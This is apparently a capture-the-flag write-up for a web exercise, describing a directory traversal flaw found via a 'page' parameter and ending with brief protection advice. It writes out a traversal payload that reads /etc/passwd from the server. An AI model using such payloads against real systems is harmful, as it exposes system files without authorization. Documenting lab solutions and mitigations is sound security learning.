# Traversal Path

### Tools
Traversal Path using dirbuster, wfuzz and manually after not finding anything with automated tools.

### How to solve it

1. Firt we use ?page=../ and we get a message.
```
 SERVER_URL/?page=../
```
2. Later on we keep trying it until we get a different message, so we trye /etc/passswd and there is the flag!
```
SERVER_URL/?page=../../../../../../../etc/passwd
```
### How to protect it
Use permission control to avoid outside people from getting the file
Validade the user permission if possible
Use most recent web server version, this is an old problem that web server are getting better to fight against it
Use non super user to run the server, so if it is accessed they can't modify the folders
Encrypt and use passwords for more important data
